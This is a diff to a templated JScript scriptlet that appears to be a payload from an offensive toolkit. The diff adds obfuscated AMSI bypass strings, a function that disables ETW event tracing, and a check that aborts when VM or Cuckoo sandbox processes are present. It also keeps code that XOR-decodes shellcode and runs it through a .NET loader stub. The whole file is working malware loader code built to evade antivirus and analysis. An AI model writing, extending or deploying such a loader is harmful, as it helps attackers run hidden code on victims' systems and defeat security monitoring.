@@ -7,14 +7,39 @@
     remotable="true">
     <script language="JScript">
     <![CDATA[
+    function {{ v.fn_build_str }}(a){var s="";for(var i=0;i<a.length;i++)s+=String.fromCharCode(a[i]);return s;}
+
     function {{ v.fn_amsi }}() {
         try {
             var asm  = new ActiveXObject("System.Reflection.Assembly");
-            var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
-            if (amsi !== null) {
-                amsi.GetField("amsiInitFailed", 36).SetValue(null, true);
+            var amsi = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
+            if (amsi !== null)
+                amsi.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), 36).SetValue(null, true);
+        } catch(e) {}
+    }
+
+    function {{ v.fn_etw }}() {
+        try {
+            var asm = new ActiveXObject("System.Reflection.Assembly");
+            var t   = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
+            if (t !== null) {
+                var fi = t.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), 36);
+                if (fi !== null) fi.SetValue(null, 0);
             }
-        } catch (e) {}
+        } catch(e) {}
+    }
+
+    function {{ v.fn_sandbox }}() {
+        try {
+            var wmi  = GetObject("winmgmts:");
+            var bad  = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe"];
+            var pq   = wmi.ExecQuery("SELECT Name FROM Win32_Process");
+            for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
+                var n = e.item().Name.toLowerCase();
+                for (var i = 0; i < bad.length; i++) { if (n === bad[i]) return true; }
+            }
+        } catch(e) {}
+        return false;
     }
 
     function {{ v.fn_hex }}(h) {
@@ -30,9 +55,10 @@
     }
 
     function {{ v.fn_run }}() {
+        if ({{ v.fn_sandbox }}()) return;
         {{ v.fn_amsi }}();
-        var sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
-                                {{ v.fn_hex }}("{{ key_hex }}"));
+        {{ v.fn_etw }}();
+        var sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"), {{ v.fn_hex }}("{{ key_hex }}"));
         var loader = new ActiveXObject("System.Reflection.Assembly");
         var asm = loader.Load({{ v.fn_hex }}("{{ v.dotnet_stub_hex }}"));
         asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
